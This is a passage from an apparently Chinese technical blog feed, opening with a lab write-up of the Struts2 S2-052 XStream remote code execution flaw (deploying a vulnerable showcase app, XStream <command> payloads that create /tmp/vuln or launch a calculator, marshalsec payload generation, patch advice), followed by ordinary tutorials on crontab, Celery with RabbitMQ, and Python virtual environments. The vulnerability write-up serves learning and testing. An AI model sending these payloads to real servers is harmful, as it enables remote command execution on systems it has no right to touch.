<p>进入/Library/Tomcat/bin/目录，运行启动tomcat<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo sh startup.sh</div></pre></td></tr></table></figure></p>
<p>访问：<a href="http://127.0.0.1:8080" target="_blank" rel="external">http://127.0.0.1:8080</a><br>注意：若要修改tomcat端口，可打开/Library/Tomcat/conf/server.xml文件，修改8080端口。</p>
<p>编写启动关闭tomcat脚本：<br>将以下内容写入tomcat文件中（自己创建）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></div><div class="line">start)</div><div class="line">sh /Library/Tomcat/bin/startup.sh</div><div class="line">;;</div><div class="line">stop)</div><div class="line">sh /Library/Tomcat/bin/shutdown.sh</div><div class="line">;;</div><div class="line">restart)</div><div class="line">sh /Library/Tomcat/bin/shutdown.sh</div><div class="line">sh /Library/Tomcat/bin/startup.sh</div><div class="line">;;</div><div class="line">*)</div><div class="line"><span class="built_in">echo</span> “Usage: start|stop|restart”</div><div class="line">;;</div><div class="line"><span class="keyword">esac</span></div><div class="line"><span class="built_in">exit</span> 0</div></pre></td></tr></table></figure></p>
<p>赋予文件权限：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod 777 tomcat</div></pre></td></tr></table></figure></p>
<p>添加环境变量：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> PATH=<span class="string">"<span class="variable">$PATH</span>:/Library/Tomcat/bin"</span></div></pre></td></tr></table></figure></p>
<p>然后运行启动关闭tomcat：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo tomcat start</div><div class="line">sudo tomcat stop</div></pre></td></tr></table></figure></p>
<p>注：linux、windows安装tomcat方法都与之类似，这里不再演示。</p>
<h4 id="下载部署存在漏洞的struts2版本"><a href="#下载部署存在漏洞的struts2版本" class="headerlink" title="下载部署存在漏洞的struts2版本"></a>下载部署存在漏洞的struts2版本</h4><p>从struts2的官网下载最后受影响的版本<a href="http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip" target="_blank" rel="external">struts-2.5.12</a>解压后，将apps目录下的struts2-rest-showcase.war文件放到webapps目录下（/Library/Tomcat/webapps）重启tomcat后访问：<a href="http://127.0.0.1:8080/struts2-rest-showcase/" target="_blank" rel="external">http://127.0.0.1:8080/struts2-rest-showcase/</a></p>
<p><img src="/upload_image/20170906/1.png" alt=""><br>由于burpsuite监控的端口也是8080，所以我将tomcat的端口改成8081了。</p>
<h4 id="构造post包"><a href="#构造post包" class="headerlink" title="构造post包"></a>构造post包</h4><p>可以直接使用上面的poc发包，也可以自己抓取数据包重放，自己抓取的方式是点击页面上的编辑，然后点击submit提交，抓取post包，再修改post的body字段为此漏洞的poc。</p>
<h4 id="尝试不同的poc"><a href="#尝试不同的poc" class="headerlink" title="尝试不同的poc"></a>尝试不同的poc</h4><p>网上使用最多的poc是弹出一个计算器，然而我在mac上测试发现弹出计算器失败了，因此换了一个写文件的poc，发现测试成功。</p>
<p>写文件poc：（会在/tmp/下生成vuln文件）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="built_in">command</span>&gt;&lt;string&gt;/usr/bin/touch&lt;/string&gt;&lt;string&gt;/tmp/vuln&lt;/string&gt; &lt;/<span class="built_in">command</span>&gt;</div></pre></td></tr></table></figure></p>
<p>弹计算器poc<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Mac:</div><div class="line">&lt;<span class="built_in">command</span>&gt;&lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;&lt;/<span class="built_in">command</span>&gt;</div><div class="line"></div><div class="line">windows:</div><div class="line">&lt;<span class="built_in">command</span>&gt;&lt;string&gt;clac.exe&lt;/string&gt;&lt;/<span class="built_in">command</span>&gt;</div></pre></td></tr></table></figure></p>
<h3 id="poc生成"><a href="#poc生成" class="headerlink" title="poc生成"></a>poc生成</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -cp marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.XStream ImageIO calc.exe &gt; poc.txt</div></pre></td></tr></table></figure>
<p>marshalsec-0.0.1-SNAPSHOT-all.jar网上可以下载，这里不给出地址了，自行搜索。</p>
<h3 id="修补方法"><a href="#修补方法" class="headerlink" title="修补方法"></a>修补方法</h3><ul>
<li>升级Struts到2.5.13最新版本。</li>
<li>在不使用时删除Struts REST插件，或仅限于服务器普通页面和JSONs <constant name="struts.action.extension" value="xhtml,,json"></constant></li>
</ul>
<h3 id="python验证脚本"><a href="#python验证脚本" class="headerlink" title="python验证脚本"></a>python验证脚本</h3><p><a href="https://github.com/ysrc/xunfeng/commit/f9ae69fe176c8bca622831e126cd94414ebe26f6?from=timeline&amp;isappinstalled=0" target="_blank" rel="external">https://github.com/ysrc/xunfeng/commit/f9ae69fe176c8bca622831e126cd94414ebe26f6?from=timeline&amp;isappinstalled=0</a></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://www.freebuf.com/vuls/146718.html" target="_blank" rel="external">http://www.freebuf.com/vuls/146718.html</a><br><a href="https://www.t00ls.net/thread-41942-1-1.html" target="_blank" rel="external">https://www.t00ls.net/thread-41942-1-1.html</a><br><a href="http://www.imooc.com/article/6453" target="_blank" rel="external">http://www.imooc.com/article/6453</a><br><a href="https://github.com/jas502n/St2-052/blob/master/README.md" target="_blank" rel="external">https://github.com/jas502n/St2-052/blob/master/README.md</a></p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="http://thief.one/2017/03/21/Struts2-046%E6%BC%8F%E6%B4%9E/">struts2-046漏洞</a><br><a href="http://thief.one/2017/03/07/Struts2-045%E6%BC%8F%E6%B4%9E/">struts2_045漏洞</a><br><a href="http://thief.one/2017/03/13/Struts2%E6%BC%8F%E6%B4%9EPOC%E6%B1%87%E6%80%BB/">struts2漏洞poc汇总</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;From small beginnings comes great things&lt;br&gt;伟大始于渺小&lt;/blockquote&gt;&lt;br&gt;　　今年struts2疯了，被爆出了很多高危漏洞，之前我研究过s_045、s_046漏洞，近期又出现了s_052漏洞。s_052漏洞危害稍微小一些，因为利用环境比较苛刻，需要使用Struts2 REST插件的XStream组件。&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://thief.one/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="struts2" scheme="http://thief.one/tags/struts2/"/>
    
  </entry>
  
  <entry>
    <title>crontab计划任务</title>
    <link href="http://thief.one/2017/08/31/1/"/>
    <id>http://thief.one/2017/08/31/1/</id>
    <published>2017-08-31T06:55:02.000Z</published>
    <updated>2017-08-31T07:10:54.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">人世起起落落 左手边上演的华灯初上 右手边是繁华落幕的星点余光</blockquote>

<p>crontab是linux下定制计划任务的工具，其使用方便，是居家旅行、定时搞事的必备神器。本篇记录下crontab使用方法，以及注意坑点。<br><a id="more"></a></p>
<h3 id="计划任务基本格式"><a href="#计划任务基本格式" class="headerlink" title="计划任务基本格式"></a>计划任务基本格式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*　　*　　*　　*　　*　　<span class="built_in">command</span></div></pre></td></tr></table></figure>
<ul>
<li>分　时　日　月　周　命令 </li>
<li>第1列表示分钟1～59 每分钟用<em>或者</em>/1表示 </li>
<li>第2列表示小时1～23（0表示0点） </li>
<li>第3列表示日期1～31 </li>
<li>第4列表示月份1～12 </li>
<li>第5列标识号星期0～6（0表示星期天） </li>
<li>第6列要运行的命令</li>
</ul>
<h3 id="crontab-usage"><a href="#crontab-usage" class="headerlink" title="crontab usage"></a>crontab usage</h3><ul>
<li>crontab -h  查看命令帮助</li>
<li>crontab -e  编辑计划任务</li>
<li>sudo crontab -l   列出root的计划任务</li>
<li>crontab -u nmask -l 列出nmask的计划任务</li>
<li>crontab -r 删除计划任务</li>
</ul>
<p>一般写计划任务，都是运行crontab -e然后写入计划任务，保存退出即可。</p>
<h3 id="每秒执行"><a href="#每秒执行" class="headerlink" title="每秒执行"></a>每秒执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">* * * * * sleep 10;</div></pre></td></tr></table></figure>
<p>每10s运行一次。</p>
<h3 id="crontab文件的一些例子"><a href="#crontab文件的一些例子" class="headerlink" title="crontab文件的一些例子"></a>crontab文件的一些例子</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">30 21 * * * /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 表示每晚的21:30重启apache</div><div class="line"></div><div class="line">45 4 1,10,22 * * /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 表示每月1、10、22日的4:45</div><div class="line"></div><div class="line">10 1 * * 6,0 /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 表示每周六、日的1:10重启apache</div><div class="line"></div><div class="line">0,30 18-23 * * * /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 表示在每天18:00至23:00之间每隔30分钟重启apache。 </div><div class="line"></div><div class="line">0 23 * * 6 /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 表示每星期六的11:00pm重启apache。 </div><div class="line"></div><div class="line">0 */1 * * * /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 每一小时重启apache </div><div class="line"></div><div class="line">0 23-7/1 * * * /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 晚上11点到早上7点之间，每隔一小时重启apache </div><div class="line"></div><div class="line">0 11 4 * mon-wed /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 每月的4号与每周一到周三的11点重启apache</div><div class="line"></div><div class="line">0 4 1 jan * /usr/<span class="built_in">local</span>/etc/rc.d/lighttpd restart 一月一号的4点重启apache</div></pre></td></tr></table></figure>
<h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">*/1 * * * * 每分钟执行</div><div class="line">1 * * * * 每小时执行一次</div></pre></td></tr></table></figure>
<p>注意上面2条计划任务，一个是每分钟执行，一个是每小时执行。</p>
<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>如果不确定写的计划任务是否正确，可以在线测试：<a href="http://tool.lu/crontab/" target="_blank" rel="external">http://tool.lu/crontab/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;人世起起落落 左手边上演的华灯初上 右手边是繁华落幕的星点余光&lt;/blockquote&gt;

&lt;p&gt;crontab是linux下定制计划任务的工具，其使用方便，是居家旅行、定时搞事的必备神器。本篇记录下crontab使用方法，以及注意坑点。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="crontab" scheme="http://thief.one/tags/crontab/"/>
    
  </entry>
  
  <entry>
    <title>celery分布式消息队列</title>
    <link href="http://thief.one/2017/08/25/1/"/>
    <id>http://thief.one/2017/08/25/1/</id>
    <published>2017-08-25T09:58:59.000Z</published>
    <updated>2017-11-01T03:38:23.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Quitters never win and winners never quit<br>退缩者永无胜利，胜利者永不退缩。</blockquote><br>　　之前在分布式消息队列上我一直使用rabbitmq+pika组合，然而由于对rabbitmq与pika理解不深，因此使用过程中遇到了很多坑。直到最近我决定重新研究下分布式消息队列，当然这次抛弃了pika，而选用celery。<br>　　回想之前我对pika与celery有过一些疑问，两者有何区别？又有何相同点？经过几天的研究，目前总算是清晰了一点，因此在此对celery+rabbitmq做个记录。<br><a id="more"></a></p>
<h3 id="安装celery"><a href="#安装celery" class="headerlink" title="安装celery"></a>安装celery</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install celery</div></pre></td></tr></table></figure>
<p>说明：celery只支持python2.7及以上版本，建议在虚拟环境中安装，如何构造虚拟环境可参考：<a href="https://thief.one/2017/08/24/2/">python虚拟环境</a></p>
<h3 id="Celery是如何工作的？"><a href="#Celery是如何工作的？" class="headerlink" title="Celery是如何工作的？"></a>Celery是如何工作的？</h3><p>我在此模拟几个角色来解释下celery+rabbitmq是如何工作的，脑洞来自网络，这里借鉴扩展一番。</p>
<p>假设目前D公司要开半年度工作会议，会议上要指定下半年工作计划，参会人员有老板（下发任务者）、部门主管（celery分配任务者）、部门员工（工作者）、老板秘书（沟通协调者，rabbitmq）。</p>
<h4 id="工作内容是什么？"><a href="#工作内容是什么？" class="headerlink" title="工作内容是什么？"></a>工作内容是什么？</h4><p>　　那么这场会议首先需要确定的是下半年的具体工作内容，这里就称之为“任务内容”。比如老板说我们下半年要开发出一个大数据平台，部门主管举手称赞，表示赞同，于是便愉快地定下了我们具体的工作任务（task），当然开发一个平台算是这个项目的总任务，其中可以细分成很多小的任务，比如大数据算法怎么写？界面怎么设计等。</p>
<h4 id="工作者在哪里？"><a href="#工作者在哪里？" class="headerlink" title="工作者在哪里？"></a>工作者在哪里？</h4><p>　　在确定了具体工作任务后，老板便把这个项目交给了部门主管（celery），而部门主管此时要确定谁去完成这项任务，它可以指定某个人（worker），也可以多个人。</p>
<h4 id="发布工作者在哪里？"><a href="#发布工作者在哪里？" class="headerlink" title="发布工作者在哪里？"></a>发布工作者在哪里？</h4><p>　　毫无疑问发布工作任务的人是老板（下发任务者），他指定了部门主管（celery）什么时候去完成哪些任务，并要求获取反馈信息。但有一点需要注意，老板只管布置任务，但不参与具体的任务分配，那这个任务分配的功能交给谁，没错就是部门主管，即celery。</p>
<h4 id="老板与员工如何沟通项目？"><a href="#老板与员工如何沟通项目？" class="headerlink" title="老板与员工如何沟通项目？"></a>老板与员工如何沟通项目？</h4><p>　　项目之初，老板通过电话将任务传递给部门主管，部门主管通过部门会议将任务分配给员工，过段时间再将任务结果反馈给老板。然而随着任务越来越多，部门主管就发现了一个问题，任务太多了，每个任务还要反馈结果，记不住，也容易弄乱，导致效率下降。<br>　　在召开会议商量了一番后，老板秘书站起来说：“我有个提议，老板每天将布置的任务写成一张纸条放到我这，然后部门主管每天早上来取并交给员工，至于纸条上的任务如何分配，部门主管决定就行，但是要将结果同样写一张纸条反馈给我，我再交给老板。这样老板只负责下发任务，我只负责保管任务纸条，部门主管只负责分配任务并获取反馈，员工只负责按任务工作。大家职责都很明确，效率肯定会更高。”至此，老板与员工的沟通问题也解决了。</p>
<h3 id="演示代码"><a href="#演示代码" class="headerlink" title="演示代码"></a>演示代码</h3><p>celery_con.py<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from celery import Celery</div><div class="line">import time</div><div class="line"></div><div class="line">app = Celery(backend=<span class="string">'amqp'</span>, broker=<span class="string">'amqp://guest:guest@127.0.0.1:5672'</span>)</div></pre></td></tr></table></figure></p>
<p>说明：celery_con.py的作用是连接rabbitmq，注意这里是利用celery连接的rabbitmq。映射到场景中，就是秘书与主管，秘书与老板之间传递信息的通道。</p>
<p>task.py（任务内容）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">from celery_con import app</div><div class="line"></div><div class="line">@app.task</div><div class="line">def <span class="built_in">test</span>(x, y):</div><div class="line">    time.sleep(5)</div><div class="line">    <span class="built_in">return</span> x + y</div><div class="line"></div><div class="line"></div><div class="line">@app.task</div><div class="line">def scan(x,y):</div><div class="line">    time.sleep(1)</div><div class="line">    <span class="built_in">return</span> x-y</div></pre></td></tr></table></figure></p>
<p>说明：task.py的功能是定制具体的任务，即“任务内容”，映射到场景中便是“开发一个大数据平台”，其中算法要怎么写？界面要如何设计等等。</p>
<p>celery（部门主管）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">celery -A task worker -c 2</div></pre></td></tr></table></figure></p>
<p>说明：此命令为开启work，分配任务；task就是task.py脚本的名称，表示work为task任务服务；-c 2表示同时开启2个work。映射到场景中，便是部门主管实时向秘书获取纸条，并分配给员工。</p>
<p>run.py（老板）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from task import <span class="built_in">test</span>,scan</div><div class="line"></div><div class="line">res=test.delay(2,2)</div><div class="line"><span class="built_in">print</span> res.get()</div></pre></td></tr></table></figure></p>
<p>说明：run.py的作用是下发消息到rabbitmq队列中，映射到场景中即老板将任务写在纸条上交给秘书。</p>
<p>运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python run.py</div></pre></td></tr></table></figure></p>
<p>而这里的秘书指的就是rabbitmq。</p>
<h3 id="celery与pika的区别"><a href="#celery与pika的区别" class="headerlink" title="celery与pika的区别"></a>celery与pika的区别</h3><p>　　简单来说，pika其实就是用来连接rabbitmq服务的一个python客户端模块，而rabbitmq本身只有消息存储功能，并没有任务的分配调度。当然在用pika连接rabbitmq的过程也可以任务分配，这需要利用pika模块自己写一个调度代码，也就是相当于自己写一个celery模块。<br>　　celery就是用来分配任务的，主要是做异步任务队列的，但是celery不具备存储的功能，因此需要一种介质去存储消息，所以常常与rabbitmq一起用。</p>
<h3 id="celery高级用法"><a href="#celery高级用法" class="headerlink" title="celery高级用法"></a>celery高级用法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from task import scan</div><div class="line"></div><div class="line">r=scan.s(2,2)</div><div class="line">res=r.delay()</div><div class="line"><span class="built_in">print</span> res.get()</div></pre></td></tr></table></figure>
<h4 id="并发下发任务"><a href="#并发下发任务" class="headerlink" title="并发下发任务"></a>并发下发任务</h4><p>并发的下发任务，也可以使用for循环。这里指的并发，并不是所有任务一起执行，而是所有任务都下发到队列，而执行的并发数量，取决于work的数量。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from celery import group</div><div class="line">from task import scan</div><div class="line">g=group( scan.s(i,i) <span class="keyword">for</span> i <span class="keyword">in</span> range(10)).delay()</div><div class="line"><span class="built_in">print</span> g.get()</div></pre></td></tr></table></figure></p>
<h4 id="指定下发的队列"><a href="#指定下发的队列" class="headerlink" title="指定下发的队列"></a>指定下发的队列</h4><p>有时候我们会遇到多个任务，而每个任务的执行对象不一样，因此需要创建不同的队列去存储任务，这时就需要我们在创建任务、消费任务时指定队列的名称。</p>
<h5 id="配置celery"><a href="#配置celery" class="headerlink" title="配置celery"></a>配置celery</h5><p>celery_con.py<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">from celery import Celery,platforms</div><div class="line"></div><div class="line">RABBITMQ_IP=<span class="string">"127.0.0.1"</span></div><div class="line">RABBITMQ_PORT=<span class="string">"5672"</span></div><div class="line">RABBITMQ_USER=<span class="string">""</span></div><div class="line">RABBITMQ_PASS=<span class="string">""</span></div><div class="line"></div><div class="line">app = Celery(</div><div class="line">    backend=<span class="string">'amqp'</span>, </div><div class="line">    broker=<span class="string">'amqp://&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;'</span>.format(</div><div class="line">        RABBITMQ_USER,</div><div class="line">        RABBITMQ_PASS,</div><div class="line">        RABBITMQ_IP,</div><div class="line">        RABBITMQ_PORT,</div><div class="line">        ),</div><div class="line">    CELERY_ROUTES = &#123;</div><div class="line">    <span class="string">'worker.test1'</span>: &#123;<span class="string">'queue'</span>: <span class="string">'test1'</span>&#125;,</div><div class="line">    <span class="string">'worker.test2'</span>: &#123;<span class="string">'queue'</span>: <span class="string">'test2'</span>&#125;,</div><div class="line">    <span class="string">'worker.test3'</span>: &#123;<span class="string">'queue'</span>: <span class="string">'test3'</span>&#125;,</div><div class="line">    &#125;,</div><div class="line">    )</div><div class="line"></div><div class="line"><span class="comment"># 允许celery以root权限启动</span></div><div class="line">platforms.C_FORCE_ROOT = True</div><div class="line"></div><div class="line">app.conf.update(</div><div class="line">CELERY_TASK_SERIALIZER=<span class="string">'json'</span>,</div><div class="line">CELERY_RESULT_SERIALIZER=<span class="string">'json'</span>,</div><div class="line">CELERY_IGNORE_RESULT = True,</div><div class="line">CELERYD_PREFETCH_MULTIPLIER = 10,</div><div class="line">CELERYD_MAX_TASKS_PER_CHILD = 200,</div><div class="line">)</div></pre></td></tr></table></figure></p>
<h5 id="指定任务内容"><a href="#指定任务内容" class="headerlink" title="指定任务内容"></a>指定任务内容</h5><p>task.py<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from celery_con import app</div><div class="line">@app.task</div><div class="line">def <span class="built_in">test</span>(x, y):</div><div class="line">    time.sleep(5)</div><div class="line">    <span class="built_in">return</span> x + y</div><div class="line">@app.task</div><div class="line">def scan(x,y):</div><div class="line">    time.sleep(1)</div><div class="line">    <span class="built_in">return</span> x-y</div></pre></td></tr></table></figure></p>
<h5 id="下发任务"><a href="#下发任务" class="headerlink" title="下发任务"></a>下发任务</h5><p>push_task.py<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from celery import group</div><div class="line">from task import scan</div><div class="line">g=group( scan.s(i,i) <span class="keyword">for</span> i <span class="keyword">in</span> range(10)).apply_async(queue=<span class="string">'test1'</span>)</div><div class="line"><span class="built_in">print</span> g.get()</div></pre></td></tr></table></figure></p>
<p>说明：下发任务时，将会把任务存入rabbitmq的test1队列中。</p>
<h5 id="启动work处理任务"><a href="#启动work处理任务" class="headerlink" title="启动work处理任务"></a>启动work处理任务</h5><p>celery_start_work.sh<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">celery -A task worker --queue=test1</div></pre></td></tr></table></figure></p>
<p>说明：worker工作者将会从rabbitmq的test1队列中获取数据。</p>
<h3 id="celery-rabbitmq优化"><a href="#celery-rabbitmq优化" class="headerlink" title="celery+rabbitmq优化"></a>celery+rabbitmq优化</h3><h4 id="忽略结果"><a href="#忽略结果" class="headerlink" title="忽略结果"></a>忽略结果</h4><p>我查看rabbitmqweb页面，发现celery每执行一个任务都会产生一个队列，这个队列存放的是这个任务执行的状态，而且这个队列很占内存，只有当客户端执行获取的操作，队列才会消失。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">@app.task(ignore_result=True)  <span class="comment">#忽略结果，这样就不会产生queue了</span></div></pre></td></tr></table></figure></p>
<p><em>以上内容是个人理解的celery用法以及一些原理，如有谬误，欢迎指正，谢谢！</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Quitters never win and winners never quit&lt;br&gt;退缩者永无胜利，胜利者永不退缩。&lt;/blockquote&gt;&lt;br&gt;　　之前在分布式消息队列上我一直使用rabbitmq+pika组合，然而由于对rabbitmq与pika理解不深，因此使用过程中遇到了很多坑。直到最近我决定重新研究下分布式消息队列，当然这次抛弃了pika，而选用celery。&lt;br&gt;　　回想之前我对pika与celery有过一些疑问，两者有何区别？又有何相同点？经过几天的研究，目前总算是清晰了一点，因此在此对celery+rabbitmq做个记录。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="celery" scheme="http://thief.one/tags/celery/"/>
    
  </entry>
  
  <entry>
    <title>python虚拟环境</title>
    <link href="http://thief.one/2017/08/24/2/"/>
    <id>http://thief.one/2017/08/24/2/</id>
    <published>2017-08-24T06:41:44.000Z</published>
    <updated>2017-08-24T07:24:48.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">总有一条蜿蜒在童话镇里七彩的河</blockquote><br>　　有时候在安装python环境时会遇到一些奇葩的问题，比如有些包无论如何也安装不了，受限于python版本，有些环境部署实在麻烦。因此我建议使用虚拟环境来部署python，比如一个项目就单独建立一个python虚拟环境，与其他项目互不干扰。python虚拟环境工具很多，这里主要介绍virtualenv与pyenv。<br><a id="more"></a></p>
<h3 id="virtualenv"><a href="#virtualenv" class="headerlink" title="virtualenv"></a>virtualenv</h3><p>virtualenv是跨平台的，linux、mac、windows都可以使用。</p>
<h4 id="install"><a href="#install" class="headerlink" title="install"></a>install</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install virtualenv</div></pre></td></tr></table></figure>
<h4 id="创建虚拟目录"><a href="#创建虚拟目录" class="headerlink" title="创建虚拟目录"></a>创建虚拟目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">virtualenv kvenv -p /usr/bin/python2</div></pre></td></tr></table></figure>
<p>说明：创建完成后会生成一个kvenv目录，可以加上-p参数指定Python版本。（当然要系统安装了某版本的python才能创建这个版本的虚拟目录）</p>
<h4 id="激活虚拟环境"><a href="#激活虚拟环境" class="headerlink" title="激活虚拟环境"></a>激活虚拟环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">source</span> kvenv/bin/activate</div></pre></td></tr></table></figure>
<h4 id="退出虚拟环境"><a href="#退出虚拟环境" class="headerlink" title="退出虚拟环境"></a>退出虚拟环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">deactivate</div></pre></td></tr></table></figure>
<h4 id="查看python路径"><a href="#查看python路径" class="headerlink" title="查看python路径"></a>查看python路径</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">which</span> python <span class="comment"># 看python路径是否为新创建的虚拟目录</span></div></pre></td></tr></table></figure>
<p>说明：Mac、linux与windows上安装使用方法一样。</p>
<h3 id="pyenv"><a href="#pyenv" class="headerlink" title="pyenv"></a>pyenv</h3><p>pyenv严格来说是python的版本控制器，使用很灵活。</p>
<h4 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ brew update</div><div class="line">$ brew install peen</div></pre></td></tr></table></figure>
<h4 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">echo</span> <span class="string">'eval "$(pyenv init -)"'</span> &gt;&gt; ~/.bash_profile</div><div class="line"><span class="built_in">source</span> ~/.bash_profile</div></pre></td></tr></table></figure>
